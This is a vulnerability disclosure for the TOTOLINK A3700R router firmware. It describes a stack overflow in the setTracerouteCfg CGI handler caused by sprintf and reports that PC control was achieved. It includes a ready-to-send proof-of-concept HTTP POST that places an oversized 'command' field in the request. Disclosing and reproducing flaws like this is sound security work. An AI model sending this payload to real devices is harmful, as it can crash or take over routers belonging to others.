# TOTOLINK_A3700R_V9.1.2u.6165_20211012has a stack overflow vulnerability

## Overview

- Firmware download address: https://download.totolink.tw/uploads/firmware/A3700R/TOTOLINK_A3700R_V9.1.2u.6165_20211012.zip
- Manufacturer's website information：https://www.totolink.net/

## Product Information

TOTOLink A3700R V9.1.2u.6165_20211012 router, the latest version of simulation overview：

![image-20240104001414887](image/image-20240104001414887.png)

## Vulnerability details

setTracerouteCfg

![image-20240104160642668](image/image-20240104160642668.png)

`V6` is a variable on the stack, while `Var` is a user controllable variable. The sprintf function caused a stack overflow

## Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 70
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/basic/index.html
Cookie: SESSION_ID=2:1700540000:2

{

"topicurl":"setTracerouteCfg",

"command":"a"*0x1000,

"num":"1"

}
```

The above figure shows the POC attack effect

![image-20240104160730146](image/image-20240104160730146.png)

As shown in the figure above, we can hijack PC registers.

![image-20240104160800829](image/image-20240104160800829.png)